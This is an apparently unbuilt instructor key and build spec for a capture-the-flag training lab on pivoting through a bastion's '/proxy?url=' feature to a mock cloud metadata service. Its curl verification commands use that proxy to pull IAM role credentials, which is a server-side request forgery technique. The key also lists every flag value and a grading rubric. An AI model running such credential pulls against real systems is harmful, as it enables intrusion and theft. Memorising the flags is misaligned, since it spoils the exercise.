# Module 5 — Lab 2: Lateral Movement via Compute/Instance-Profile Pivoting — Instructor Key

> **⚠️ PLANNED CONTENT — not yet built.** Build spec, implementation-ready. Depends
> on Module 3 Lab 5's jump-host SSH key. Flag values below are placeholders
> generated at planning time.

## New assets

**`bastion.soulsecure.lab`** (new vhost via `www` gateway): landing/dashboard route +
a `/proxy` route. Auth: header `X-SSH-Key-Fingerprint` must match the real MD5
fingerprint of the jump-host key generated for Module 3 Lab 5 (compute it once at
build time with `ssh-keygen -lf jump-host-id_rsa -E md5` and hardcode the expected
value — this is a real, correctly-computable fingerprint, not a placeholder string).

**`internal-svc`** (new container, Docker-internal name only, no public vhost/DNS —
same pattern as Module 3 Lab 2's `config-service`/`imds-sim`, reachable only from
`bastion`'s network): implements a small IMDS-shaped metadata surface, structurally
identical to Module 3 Lab 2's `imds-sim` but a separate instance/role.

## Routes (ground truth)

| Method | Path | Container | Auth | Behavior |
|---|---|---|---|---|
| GET | `/` | `bastion` | `X-SSH-Key-Fingerprint` header match | Landing page/dashboard + `<!-- flag{a047843f2cfae9a88e0bf81a4ce8f1dc} -->` |
| GET | `/proxy?url=<url>` | `bastion` | same fingerprint header (session-equivalent — required on every call, no cookie state needed) | Server-side `GET` of `url`, returns response verbatim — deliberately mirrors Module 3 Lab 2's `fetch-preview` shape |
| GET | `/latest/meta-data/` | `internal-svc` | none (reachable only via `bastion`'s network) | Listing: `iam/\ninstance-id` |
| GET | `/latest/meta-data/iam/security-credentials/` | `internal-svc` | none | `soulsecure-internal-svc-role` |
| GET | `/latest/meta-data/iam/security-credentials/soulsecure-internal-svc-role` | `internal-svc` | none | `{"AccessKeyId":"ASIAINTERNALSVC04","SecretAccessKey":"<value>","Token":"<value>","Expiration":"...","flag":"flag{54508c0acdd49305a73f7e5e48c87271}"}` |

`GET /proxy?url=http://internal-svc:8080/latest/meta-data/iam/security-credentials/`
(the listing call) returns `soulsecure-internal-svc-role` plus
`"flag":"flag{36a809a129fb2d022edc547d7105ab06}"` appended by the `bastion` proxy
wrapper (not by `internal-svc` itself, which stays a clean IMDS mock) — **Flag 2**.

## Registry addition: `soulsecure-internal-svc-role`

New principal in `iam-sim`'s registry (extends Module 4 Lab 1's canonical table):
```
ARN: arn:aws:iam::445566778899:role/soulsecure-internal-svc-role
Policy (InternalSvcRolePolicy):
{"Version":"2012-10-17","Statement":[
  {"Effect":"Allow","Action":["sts:GetCallerIdentity"],"Resource":"*"},
  {"Effect":"Allow","Action":["compute:AccessDockerProxy"],"Resource":"arn:aws:compute:::docker-proxy"}
]}
```
`compute:AccessDockerProxy` is an invented-but-clearly-explained permission
namespace (same pattern as Module 4 Lab 3's `automation:*`) representing whether
this role is allowed to reach the Docker socket proxy exploited in Lab 3.

`GET /iam/whoami-summary` (existing route, extend to recognize
`ASIAINTERNALSVC04`) returns:
```json
{"principal": "soulsecure-internal-svc-role", "attached_policies": ["InternalSvcRolePolicy"],
 "note": "Has compute:AccessDockerProxy -- points to docker-proxy.internal.soulsecure.lab, reachable via the bastion proxy the same way internal-svc was.",
 "flag": "flag{e6654fd5213b02dc8b16d762b3e1afd3}"}
```
**Flag 4** (harder mode) — this is the Lab 3 discovery hook.

## Flags (ground truth — placeholder values, see banner)

| Flag | Location | Value |
|---|---|---|
| Flag 1 | `bastion.soulsecure.lab/` with valid fingerprint header | `flag{a047843f2cfae9a88e0bf81a4ce8f1dc}` |
| Flag 2 | `bastion` `/proxy` → `internal-svc` role-listing call | `flag{36a809a129fb2d022edc547d7105ab06}` |
| Flag 3 | `internal-svc` → `soulsecure-internal-svc-role` credentials | `flag{54508c0acdd49305a73f7e5e48c87271}` |
| Flag 4 (harder mode) | `iam-sim` `whoami-summary` for `soulsecure-internal-svc-role` | `flag{e6654fd5213b02dc8b16d762b3e1afd3}` |

## Verification commands (once built)

```bash
FP=$(ssh-keygen -lf jump-host-id_rsa -E md5 | awk '{print $2}')
curl -sk https://bastion.soulsecure.lab/ -H "X-SSH-Key-Fingerprint: $FP"                     # Flag 1

curl -sk "https://bastion.soulsecure.lab/proxy?url=http://internal-svc:8080/latest/meta-data/iam/security-credentials/" \
  -H "X-SSH-Key-Fingerprint: $FP"                                                            # Flag 2

curl -sk "https://bastion.soulsecure.lab/proxy?url=http://internal-svc:8080/latest/meta-data/iam/security-credentials/soulsecure-internal-svc-role" \
  -H "X-SSH-Key-Fingerprint: $FP"                                                            # Flag 3

curl -sk https://iam.soulsecure.lab/iam/whoami-summary \
  -H "X-Access-Key-Id: ASIAINTERNALSVC04" -H "X-Secret-Access-Key: <secret>"                 # Flag 4
```

## Grading rubric (out of 100, proposed)

| Criterion | Points |
|---|---|
| Correctly computed and used the SSH key fingerprint to reach the bastion | 20 |
| Used the bastion's proxy feature to reach `internal-svc` | 20 |
| Retrieved `soulsecure-internal-svc-role` credentials | 20 |
| Checked the new role's permissions in `iam-sim` and correctly identified the Lab 3 hook | 25 |
| Clean deliverable table showing the full hop-by-hop path | 15 |

## Design notes / narrative threads

- Reusing the exact `fetch-preview`/`proxy?url=` shape from Module 3 Lab 2 is
  deliberate — students should recognize "I've done this before," reinforcing that
  SSRF and legitimate-pivot-then-recon are mechanically similar even though the
  access vector differs.
- `soulsecure-internal-svc-role`'s single interesting permission
  (`compute:AccessDockerProxy`) exists purely to hand off cleanly to Lab 3 — resist
  the urge to give it more permissions than that; it doesn't need to be independently
  interesting beyond being the key to the next lab.

## File locations (proposed)

- `/opt/soulsecure-labs/apps/bastion_app.py` (new) — fingerprint check + `/proxy`
  (near-identical to Module 3's `fetch-preview` implementation, can share code)
- `/opt/soulsecure-labs/apps/internal_svc_imds.py` (new, small, mirrors
  `imds_sim.py`'s structure from Module 3 Lab 2)
- `/opt/soulsecure-labs/apps/iam_sim.py` — add `soulsecure-internal-svc-role` to the
  registry
- `docker-compose.yml` — add `bastion` (vhost via gateway) and `internal-svc`
  (internal-only, same network as `bastion`) services

## Known limitations

Same fingerprint-based simplification noted in the StudentGuide — this is not a
working SSH/VPN tunnel. `internal-svc`'s IMDS mock is deliberately minimal (only the
one role) compared to Module 3 Lab 2's two-role, IMDSv2-gated design — no need to
repeat that lab's full depth here, the point of this lab is the pivot itself.
